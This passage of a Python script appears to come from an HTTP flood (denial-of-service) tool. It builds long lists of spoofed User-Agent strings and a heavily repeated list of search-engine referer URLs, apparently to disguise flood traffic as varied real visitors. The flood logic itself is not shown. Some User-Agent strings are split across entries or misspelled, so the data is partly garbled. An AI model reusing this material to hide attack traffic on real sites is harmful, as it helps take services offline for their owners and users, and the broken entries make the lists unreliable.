        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
	headers_useragents.append('(Privoxy/1.0)')
	headers_useragents.append('*/Nutch-0.9-dev')
	headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
	headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')


headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; MIDC41') 

headers_useragents.append('Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91)') 
headers_useragents.append('App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; Explay Surfer 7.02 Build/ICS.g12refM703A1HZ1.20121009) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0')

headers_useragents.append(' Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko)')
headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')
headers_useragents.append('Mozilla/5.0 (Android; Mobile; rv:18.0) Gecko/18.0 Firefox/18.0')

headers_useragents.append(' Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko)')

headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)')

headers_useragents.append('AppleWebKit/535.19 (KHTML, like Gecko)')


headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')

headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K)')

headers_useragents.append('AppleWebKit/535.19 (KHTML, like Gecko)')

headers_useragents.append('Chrome/18.0.1025.166 Mobile Safari/535.19')

headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)')

headers_useragents.append('AppleWebKit/535.19 (KHTML, like Gecko)')

headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F)')

headers_useragents.append('AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')

headers_useragents.append('Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Nexus S Build/JRO03E)')

headers_useragents.append('AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')

headers_useragents.append('Mozilla/5.0 (Linux; Android 4.2.1; Nexus 10 Build/JOP40D)')

headers_useragents.append('AppleWebKit/535.19 (KHTML, like Gecko)')

headers_useragents.append('Chrome/18.0.1025.166 Safari/535.19')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I9300 Build/JZO54K)')

headers_useragents.append('AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30')

headers_useragents.append('Mozilla/5.0 (Linux; Android 4.2.1; Galaxy Nexus Build/JOP40D)')

headers_useragents.append('AppleWebKit/535.19 (KHTML, like Gecko)') 

headers_useragents.append('Chrome/18.0.1025.166 Mobile Safari/535.19')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-N5100 Build/JZO54K)')


headers_useragents.append('CSSCheck/1.2.2')
headers_useragents.append('Cynthia 1.0')
headers_useragents.append('HTMLParser/1.6')
headers_useragents.append('P3P Validator')

headers_useragents.append('W3C_Validator/1.654')
headers_useragents.append('W3C_Validator/1.606')
headers_useragents.append('W3C_Validator/1.591')
headers_useragents.append('W3C_Validator/1.575')
headers_useragents.append('W3C_Validator/1.555')
headers_useragents.append('W3C_Validator/1.432.2.5')
headers_useragents.append('W3C_Validator/1.432.2.22')
headers_useragents.append('W3C_Validator/1.432.2.19')
headers_useragents.append('W3C_Validator/1.432.2.10')
headers_useragents.append('W3C_Validator/1.305.2.12 libwww-perl/5.64')
headers_useragents.append('WDG_Validator/1.6.2')


headers_useragents.append('amaya/11.3.1 libwww/5.4.1')
headers_useragents.append('amaya/11.2 libwww/5.4.0')
headers_useragents.append('amaya/11.1 libwww/5.4.0')
headers_useragents.append('amaya/10.1 libwww/5.4.0')
headers_useragents.append('amaya/10 libwww/5.4.0')
headers_useragents.append('amaya/9.55 libwww/5.4.0')
headers_useragents.append('amaya/9.54 libwww/5.4.0')
headers_useragents.append('amaya/9.52 libwww/5.4.0')
headers_useragents.append('amaya/9.51 libwww/5.4.0')
headers_useragents.append('amaya/8.8.5 libwww/5.4.0')
headers_useragents.append('amaya/11.2 amaya/5.4.0')
headers_useragents.append('amaya/11.1 amaya/5.4.0')
headers_useragents.append('Cocoal.icio.us/1.0 (v43) (Mac OS X; http://www.scifihifi.com/cocoalicious)')
headers_useragents.append('Cocoal.icio.us/1.0 (v40) (Mac OS X; http://www.scifihifi.com/cocoalicious)')
headers_useragents.append('Cocoal.icio.us/1.0 (v38) (Mac OS X; http://www.scifihifi.com/cocoalicious)')
headers_useragents.append('DomainsDB.net MetaCrawler v.0.9.7c (http://domainsdb.net/)')
headers_useragents.append('GSiteCrawler/v1.20 rev. 273 (http://gsitecrawler.com/)')
headers_useragents.append('GSiteCrawler/v1.12 rev. 260 (http://gsitecrawler.com/)')
headers_useragents.append('GSiteCrawler/v1.06 rev. 251 (http://gsitecrawler.com/)')
headers_useragents.append('iTunes/9.1.1')
headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
headers_useragents.append('iTunes/9.0.3')
headers_useragents.append('iTunes/9.0.2 (Windows; N)')
headers_useragents.append('itunes/9.0.2 (Macintosh; Intel Mac OS X 10.4.11)')

headers_useragents.append('Mozilla/5.0 (Danger hiptop 3.4; U; AvantGo 3.2)')

headers_useragents.append('Mozilla/3.0 (compatible; AvantGo 3.2)')
headers_useragents.append(' Mozilla/5.0 (compatible; AvantGo 3.2;')
headers_useragents.append('ProxiNet; Danger hiptop 1.0)')

headers_useragents.append('DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)')
headers_useragents.append('DoCoMo/2.0 SH901iC(c100;TB;W24H12)')
headers_useragents.append('DoCoMo/1.0/N503is/c10')
headers_useragents.append('KDDI-KC31 UP.Browser/6.2.0.5 (GUI)') 
headers_useragents.append('MMP/2.0')
headers_useragents.append('UP.Browser/3.04-TS14 UP.Link/3.4.4')
headers_useragents.append('Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1')
headers_useragents.append('J-PHONE/5.0/V801SA/SN123456789012345 SA/0001JP Profile/MIDP-1.0')
headers_useragents.append('Mozilla/3.0(DDIPOCKET;JRC/AH-J3001V,AH-J3002V/1.0/0100/c50)CNF/2.0')
headers_useragents.append('PDXGW/1.0')
headers_useragents.append('ASTEL/1.0/J-0511.00/c10/smel')
headers_useragents.append('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us)')
headers_useragents.append('AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16')
headers_useragents.append('Version/4.0 Mobile Safari/533.1')

headers_useragents.append('Mozilla/1.22 (compatible; MSIE 5.01;')
headers_useragents.append('PalmOS 3.0) EudoraWeb 2.1')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 4.01;')
headers_useragents.append('Windows CE; PPC; 240x320)')
headers_useragents.append('Mozilla/2.0 (compatible; MSIE 3.02;')
headers_useragents.append('Windows CE; PPC; 240x320)')
headers_useragents.append('Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619')
headers_useragents.append('Minimo/0.020')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610')
headers_useragents.append('Minimo/0.016')
headers_useragents.append('OPWV-SDK UP.Browser/7.0.2.3.119 (GUI) MMP/2.0 Push/PO')
headers_useragents.append('UP.Browser/6.1.0.1.140 (Google CHTML Proxy/1.0)')

headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.0; PalmOS) PLink 2.56b')
headers_useragents.append('Mozilla/5.0 (PDA; NF35WMPRO/1.0; like Gecko) NetFront/3.5')
headers_useragents.append('Mozilla/4.08 (Windows; Mobile Content Viewer/1.0) NetFront/3.2')
headers_useragents.append('Mozilla/4.0 (PS2; PlayStation BB Navigator 1.0) NetFront/3.0')
headers_useragents.append('Mozilla/4.0 (PDA; PalmOS/sony/model crdb/Revision:1.1.36(de)) NetFront/3.0')
headers_useragents.append('Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0')
headers_useragents.append('Mozilla/4.0 (PDA; Windows CE/0.9.3) NetFront/3.0')
headers_useragents.append('Mozilla/4.0 (PDA; Windows CE/1.0.1) NetFront/3.0')
headers_useragents.append('Mozilla/4.0 (PDA; SL-C750/1.0,Embedix/Qtopia/1.3.0) NetFront/3.0 	Zaurus C750')
headers_useragents.append('WM5 PIE')
headers_useragents.append('Xiino/1.0.9E [en] (v. 4.1; 153x130; g4)')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 3.2.1; en-gb; A501 Build/HTK55D)')
headers_useragents.append('Opera/9.80 (Android 3.2.1; Linux; Opera')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; A500 Build/HRI66)')

headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64)')
headers_useragents.append('Mozilla/5.0 (Linux; Android 4.1.1;')

headers_useragents.append('Mozilla/5.0 (Linux; U; Android 4.0.4; en-us;')

headers_useragents.append('Version/4.0 Safari/534.30')
headers_useragents.append('Mozilla/5.0 (Linux; U; Android 2.3.6; en-us;')
headers_useragents.append('VS840 4G Build/GRK39F)') 
headers_useragents.append('AppleWebKit/533.1 (KHTML, like Gecko)')
headers_useragents.append('Version/4.0 Mobile Safari/533.1')

headers_useragents.append('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')

headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36')
headers_useragents.append('Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36')

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                       
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.google.com/?q=')                                       
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.bing.com/search?q=')                                   
	headers_referers.append('http://search.yahoo.com/search?p=')                              
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
